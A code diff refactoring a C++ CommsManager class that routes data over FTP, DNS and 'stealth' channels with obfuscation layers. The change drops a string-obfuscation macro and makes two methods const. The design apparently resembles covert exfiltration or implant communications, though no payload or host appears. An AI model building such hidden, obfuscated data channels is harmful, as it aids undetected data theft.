@@ -6,7 +6,6 @@
 #include "communication/FtpComms.h" 
 #include "communication/DnsComms.h"
 #include "security/StealthComms.h"
-#include "security/Obfuscation.h"
 #include "core/Logger.h"
 #include "core/Configuration.h"
 #include "utils/NetworkUtils.h"
@@ -21,8 +20,6 @@
 #include <utility>
 
 #include "Encryption.h"
-
-static const std::string OBF_COMMS_MANAGER = OBFUSCATE("CommsManager");
 
 CommsManager::CommsManager(Configuration* config)
     : m_config(config), m_currentMethod(nullptr) {
@@ -141,7 +138,7 @@ bool CommsManager::TransmitData(const std::vector<uint8_t>& data) {
     return success;
 }
 
-std::vector<uint8_t> CommsManager::ApplySecurityLayers(const std::vector<uint8_t>& data) {
+std::vector<uint8_t> CommsManager::ApplySecurityLayers(const std::vector<uint8_t>& data) const {
     std::vector<uint8_t> securedData = data;
     
     // Step 1: Add metadata
@@ -193,7 +190,7 @@ void CommsManager::AddIntegrityCheck(std::vector<uint8_t>& data) {
     data.insert(data.begin(), checksumHeader.begin(), checksumHeader.end());
 }
 
-std::vector<uint8_t> CommsManager::ObfuscateData(const std::vector<uint8_t>& data) {
+std::vector<uint8_t> CommsManager::ObfuscateData(const std::vector<uint8_t>& data) const {
     // Use multiple obfuscation techniques
     std::vector<uint8_t> obfuscated = data;
     
